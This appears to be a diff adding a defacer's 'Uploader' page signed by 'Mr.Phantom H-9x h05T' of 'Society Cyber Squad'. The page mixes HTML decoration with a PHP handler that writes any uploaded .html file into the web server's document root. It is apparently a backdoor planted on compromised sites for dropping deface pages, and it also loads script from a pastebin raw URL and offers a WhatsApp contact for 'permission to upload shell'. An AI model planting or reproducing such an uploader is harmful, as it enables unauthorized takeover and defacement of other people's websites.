@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<!-- ./Mr.Phantom H-9x h05T Gans Sangad -->
+<!-- Cie Keciduk Yang Mau Recode -->
+<html>
+<head>
+<meta property="og:image" content="https://i.ibb.co/kx9T2gV/Pics-Art-08-14-07-10-16.png"> 
+ <title>#</title><title>ҳ̸Ҳ̸ҳ Uploader By Mr.Phantom H-9x h05T ҳ̸Ҳҳ̸</title>
+  <meta charset="UTF-8">
+  <meta name="Author" content="Mr.Phantom H-9x h05T"> 
+  <meta name="copyright" content="Mr.Phantom H-9x h05T"> 
+  <meta name="description" content="Knocked By~#Mr.Phantom H-9x h05T"> 
+  <link href="http://fonts.googleapis.com/css?family=Megrim" rel="stylesheet" type="text/css"> 
+  <link href="http://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet" type="text/css">
+<style></style>
+
+<script type="text/javascript">
+var snowmax=35
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+var snowletter="*"
+var sinkspeed=0.6
+var snowmaxsize=22
+var snowminsize=8
+var snowingzone=1
+// Do not edit below this line
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+function randommaker(range) {		
+	rand=Math.floor(range*Math.random())
+    return rand
+}
+function initsnow() {
+	if (ie5 || opera) {
+		marginbottom = document.body.clientHeight
+		marginright = document.body.clientWidth
+	}
+	else if (ns6) {
+		marginbottom = window.innerHeight
+		marginright = window.innerWidth
+	}
+	var snowsizerange=snowmaxsize-snowminsize
+	for (i=0;i<=snowmax;i++) {
+		crds[i] = 0;                      
+    	lftrght[i] = Math.random()*15;         
+    	x_mv[i] = 0.03 + Math.random()/10;
+		snow[i]=document.getElementById("s"+i)
+		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+		snow[i].size=randommaker(snowsizerange)+snowminsize
+		snow[i].style.fontSize=snow[i].size
+		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+		snow[i].sink=sinkspeed*snow[i].size/5
+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+		snow[i].style.left=snow[i].posx
+		snow[i].style.top=snow[i].posy
+	}
+	movesnow()
+}
+function movesnow() {
+	for (i=0;i<=snowmax;i++) {
+		crds[i] += x_mv[i];
+		snow[i].posy+=snow[i].sink
+		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+		snow[i].style.top=snow[i].posy
+		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+			snow[i].posy=0
+		}
+	}
+	var timer=setTimeout("movesnow()",50)
+}
+for (i=0;i<=snowmax;i++) {
+	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+	window.onload=initsnow
+}
+</script>
+
+<style type="text/css">
+/* latin */ @font-face { font-family: 'Iceland'; font-style: normal; font-weight: 400; src: local('Iceland'), local('Iceland-Regular'), url(https://fonts.gstatic.com/s/iceland/v8/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+</style>
+
+<style type="text/css">
+/* latin */
+@font-face {
+  font-family: 'Wallpoet';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Wallpoet'), url(https://fonts.gstatic.com/s/wallpoet/v11/f0X10em2_8RnXVVdUObp58Tt868H.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+</style>
+
+<style type="text/css">
+.b0y101{
+	background: #EC5159;
+	border-top: none;
+	border-right: none;
+	border-left: none;
+	border-radius: 5px;
+	padding: 10px 20px;
+	color: #eee;
+	font-size: 15pt;
+	border-bottom:4px solid #BF3D3D;
+}
+<style type="text/css">
+	body {background-color:black;}
+	#q {font: 40px impact;color:#ffffff;}
+</style> 
+  <style type="text/css">
+#outerCircleText {
+font-style: italic;font-weight: bold;font-family: 'comic sans ms', verdana, arial;color: red;
+position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}#outerCircleText div {position: relative;}#outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
+</style> 
+  <script type="text/javascript">
+;(function(){
+var msg = "<<<[ Mr.Phantom H-9x h05T ]>>>";
+var size = 24;
+var circleY = 0.75; 
+var circleX = 2;
+var letter_spacing = 5;
+var diameter = 15;
+var rotation = 0.4;
+var speed = 0.2;
+if (!window.addEventListener && !window.attachEvent || !document.createElement) return;
+msg = msg.split('');
+var n = msg.length - 1, a = Math.round(size * diameter * 0.208333), currStep = 20,
+ymouse = a * circleY + 20, xmouse = a * circleX + 20, y = [], x = [], Y = [], X = [],
+o = document.createElement('div'), oi = document.createElement('div'),
+b = document.compatMode && document.compatMode != "BackCompat"? document.documentElement : document.body,
+mouse = function(e){
+ e = e || window.event;
+ ymouse = !isNaN(e.pageY)? e.pageY : e.clientY; // y-position
+ xmouse = !isNaN(e.pageX)? e.pageX : e.clientX; // x-position
+},
+makecircle = function(){ // rotation/positioning
+ if(init.nopy){
+  o.style.top = (b || document.body).scrollTop + 'px';
+  o.style.left = (b || document.body).scrollLeft + 'px';
+ };
+ currStep -= rotation;
+ for (var d, i = n; i > -1; --i){ // makes the circle
+  d = document.getElementById('iemsg' + i).style;
+  d.top = Math.round(y[i] + a * Math.sin((currStep + i) / letter_spacing) * circleY - 15) + 'px';
+  d.left = Math.round(x[i] + a * Math.cos((currStep + i) / letter_spacing) * circleX) + 'px';
+ };
+},
+drag = function(){ // makes the resistance
+ y[0] = Y[0] += (ymouse - Y[0]) * speed;
+ x[0] = X[0] += (xmouse - 20 - X[0]) * speed;
+ for (var i = n; i > 0; --i){
+  y[i] = Y[i] += (y[i-1] - Y[i]) * speed;
+  x[i] = X[i] += (x[i-1] - X[i]) * speed;
+ };
+ makecircle();
+},
+init = function(){ 
+ if(!isNaN(window.pageYOffset)){
+  ymouse += window.pageYOffset;
+  xmouse += window.pageXOffset;
+ } else init.nopy = true;
+ for (var d, i = n; i > -1; --i){
+  d = document.createElement('div'); d.id = 'iemsg' + i;
+  d.style.height = d.style.width = a + 'px';
+  d.appendChild(document.createTextNode(msg[i]));
+  oi.appendChild(d); y[i] = x[i] = Y[i] = X[i] = 0;
+ };
+ o.appendChild(oi); document.body.appendChild(o);
+ setInterval(drag, 25);
+},
+ascroll = function(){
+ ymouse += window.pageYOffset;
+ xmouse += window.pageXOffset;
+ window.removeEventListener('scroll', ascroll, false);
+};
+o.id = 'outerCircleText'; o.style.fontSize = size + 'px';
+if (window.addEventListener){
+ window.addEventListener('load', init, false);
+ document.addEventListener('mouseover', mouse, false);
+ document.addEventListener('mousemove', mouse, false);
+  if (/Apple/.test(navigator.vendor))
+   window.addEventListener('scroll', ascroll, false);
+}
+else if (window.attachEvent){
+ window.attachEvent('onload', init);
+ document.attachEvent('onmousemove', mouse);
+};
+})();
+</script> 
+</head>
+</script>
+<style type="text/css">
+body{
+background:url(http://2.bp.blogspot.com/-7NpAGkYujks/TgixWQQfY-I/AAAAAAAAAJ8/y4gO3msWqqY/s1600/snow.gif) repeat center center fixed black;
+}
+</style>
+<br>
+<br>
+  <center>
+ <img src="https://i.ibb.co/kx9T2gV/Pics-Art-08-14-07-10-16.png" width="400" height="400">
+ </center>
+ <br>
+<center>
+<img src="http://bestanimations.com/Nature/Flora/Hemp/animated-hemp-marijuana-gif-6.gif" height="100px" width="100px">
+  <font color="red" size="12" face="Wallpoet">Mr.Phantom</font>
+   <font color="yellow" size="12" face="Wallpoet">H-9x </font>
+    <font color="lime" size="12" face="Wallpoet"> h05T</font>
+  <img src="http://bestanimations.com/Nature/Flora/Hemp/animated-hemp-marijuana-gif-6.gif" height="100px" width="100px">
+</center>
+<br>
+<center>
+<font face="Iceland" color="white" size="6">Society Cyber Squad</font>
+</center>
+<br>
+<hr color="Yellow"size="6">
+  <center> 
+    <font size="6"> 
+     <marquee behavior="scroll" direction="left" scrollamount="15" scrolldelay="10" width="100%"> 
+      <script type="text/javascript">
+//<![CDATA[
+
+/*
+Teks berganti-ganti warna Script by Matt Hedgecoe
+Featured on JavaScript Kit, visit http://www.javascriptkit.com/script/script2/rainbowtext.shtml
+*/
+var text="<<< Mr.Phantom H-9x h05T - Tn.Kuuhaku - MEXO_7 - MR.HERMAWAN - Mr.Breker - Tn-Ucup99 - Tn.Gen - Mr.Nimous - AnonSec 105 - X-ZETLER - Mr.Blank- Mr.Noob - SK08_25 - Mr.A Wibu - Mr.NEWBIE - Mr.Ron7x - Zeitrem - X-5L0W - Mr.Oxygen - MR.Rimpil - ZxMarchia - TN.PLI-PLI - XnuiXiunX - Mr.Cahsun - Lee7 - Mr.0M1SH4RK - Mrs QueenRa- Tyr3 - ED~3X1T >>> "
+var speed=6//
+if (document.all||document.getElementById){
+document.write('<span id="highlight">' + text + '</span>')
+var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
+}
+else
+document.write(text)
+var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
+var r=1
+var g=1
+var b=1
+var seq=1
+function changetext(){
+rainbow="#"+hex[r]+hex[g]+hex[b]
+storetext.style.color=rainbow
+}
+function change(){
+if (seq==6){
+b--
+if (b==0)
+seq=1
+}
+if (seq==5){
+r++
+if (r==12)
+seq=6
+}
+if (seq==4){
+g--
+if (g==0)
+seq=5
+}
+if (seq==3){
+b++
+if (b==12)
+seq=4
+}
+if (seq==2){
+r--
+if (r==0)
+seq=3
+}
+if (seq==1){
+g++
+if (g==12)
+seq=2
+}
+changetext()
+}
+function starteffect(){
+if (document.all||document.getElementById)
+flash=setInterval("change()",speed)
+}
+starteffect()
+//]]>
+</script>
+     </marquee></font> 
+   </center> <br> 
+   <center>
+<hr color="yellow"size="15">
+<br>
+<hr color="grey"size="60">
+<br>
+<center></center>  
+ <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="author" content="Rands"> <!-- Btw hapus author mandul +- ga nikah +- maqlo dead -->
+    <meta name="theme-color" content="#000">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
+    <link rel="icon" href="https://i.ibb.co/kx9T2gV/Pics-Art-08-14-07-10-16.png" type="image/jpg">
+    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
+    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
+		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
+    <title>#</title>
+    <style>
+    	body{background-color:#000;font-family:"Righteous";color:#fff;}
+    	#ico{width:200px;height:150px;}
+    </style>
+
+    <div class="container text-center mx-auto">
+    	
+    	<form method="post" enctype="multipart/form-data">
+    		<div class="row">
+    			<div class="col">
+    				<input id="previews" placeholder="" class="form-control bg-white text-green" readonly="readonly">
+    			</div>
+    			
+    			<div class="col">
+    				<div class="input-group">
+    					<div class="custom-file">
+    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
+    						<label class="custom-file-label bg-transparent" for="previews"></label>
+    					</div>
+    				</div>
+    			</div>
+    		</div>
+    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-blue mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Sabar Lagi loding boss">Upload</button>
+    	</form><hr>
+
+<?php
+	$server   = $_SERVER['DOCUMENT_ROOT'];
+	$namaFile = $_FILES['randsx']['name'];
+	$getcwd   = "$server/$namaFile";
+	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
+if(isset($_POST['upload'])){
+if($namaFile !== ''){
+	if(is_writable($server)){
+		if($typeExt === 'html'){
+			if($namaFile !== 'index.html'){
+				if(@copy($_FILES['randsx']['tmp_name'], $getcwd)){
+					$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
+					echo '<script>swal("Berhasil", "Di cobain BOSS Ku :)", "success")</script>';
+					echo '<a href="'.$akses.$namaFile.'" target="_blank"><====[]Hasil Upload Nya Klick disini aja boss[]====></a>';
+				}else{
+					echo '<script>swal("Gagal Upload", "Faktor Face", "error")</script>';
+				}
+			}else{
+				echo '<script>swal("Gagal Upload", "Mau Nebas? Enak aja", "error")</script>';
+			}
+		}else{
+			echo '<script>swal("Lu Mau Apa?", "Lu Mau Upload shell [ Izin Dulu Asu ]", "error")</script>';
+			}
+		}else{
+			echo '<script>swal("Gagal Upload", "Server Ga Support", "error")</script>';
+		}
+	}else{
+		echo '<script>swal("GBLK", "Pilih dulu file nya ", "info")</script>';
+	}
+}
+?>
+<footer>
+	<small>&copy; Copyright Mr.Phantom H-9x h05T</small>
+</footer>
+    </div>
+		<script>
+			document.getElementById('FileSel').onchange = function()
+			{
+				document.getElementById('previews').value = this.value;
+			};
+			
+			$('.btn').on('click', function(){
+				var $this = $(this);
+				$this.button('loading');
+			});
+			
+		</script>
+<center><form action="https://api.whatsapp.com/send?phone=62895617553368&amp;text=*Assalamualaikum*%20*Wr*%20*wb*%20Izin%20Upload%20Shell%20Dong" method="POST"> 
+                                                  <div style="width:40%" class="form-group"> 
+                                                   <input type="submit" name="gsubmit" class="btn btn-block" style="color:white;background-color: Blue;" id="gsubmit" value="Click Chat Gw"><center></center>
+<audio autoplay="autoplay" src="https://3.top4top.net/m_1288yvntr0.mp3" type="audio/mpeg"></audio>
+</center><center><center></center></center><script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
+		<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+		<font size="15" color="white"></font>
+		<div id="Clock" align="center" style="font-size:65px;font-family:'iceland';color:cyan;">00:00:00 AM</div>
+		<hr width="40%">
+		<style type="text/css">
+#outerCircleText {
+font-style: italic;
+font-weight: bold;
+font-family: Orbitron;
+color: red;
+position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
+#outerCircleText div {position: relative;}
+#outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
+		</style>
+		<script type="text/javascript">
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
+		</script>
+		</i></i></font></font></font>
+	</td>
+</tr>
+</tbody>
+</table>
+</body>
+</html>
